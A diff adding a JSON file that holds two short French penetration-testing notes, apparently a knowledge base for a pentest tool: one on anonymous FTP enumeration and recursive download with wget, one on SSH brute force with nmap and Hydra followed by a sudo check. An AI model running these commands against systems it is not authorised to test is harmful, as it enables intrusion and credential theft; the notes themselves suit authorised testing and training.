@@ -1,0 +1,14 @@
+{
+  "texts": [
+    "# Exploitation FTP - Accès Anonyme\nSi le service FTP (port 21) autorise les connexions anonymes, il est possible d'énumérer les fichiers sensibles.\n\n## [1] Énumération\n```bash\nftp <target_ip>\n# Login: anonymous\n# Pass: <any>\nls -R\n```\n\n## [2] Exploitation\nTentez de télécharger des fichiers de configuration ou des sauvegardes (.sql, .ini, .log).\n```bash\nwget -r ftp://anonymous@<target_ip>/\n```\n\n## [3] Post-Exploitation\nAnalysez les fichiers pour trouver des identifiants ou des clés SSH.\n",
+    "# Bruteforce SSH (Port 22)\nSi une énumération d'utilisateurs a réussi, tentez un bruteforce avec Hydra.\n\n## [1] Énumération\nIdentifiez la version SSH.\n```bash\nnmap -sv <target_ip> -p 22\n```\n\n## [2] Exploitation\nUtilisez une liste d'utilisateurs courants (root, admin, user).\n```bash\nhydra -L users.txt -P passwords.txt <target_ip> ssh\n```\n\n## [3] Post-Exploitation\nUne fois connecté, vérifiez les privilèges sudo.\n```bash\nsudo -l\n```\n"
+  ],
+  "metadata": [
+    {
+      "source": "ftp_anon.md"
+    },
+    {
+      "source": "ssh_brute.md"
+    }
+  ]
+}
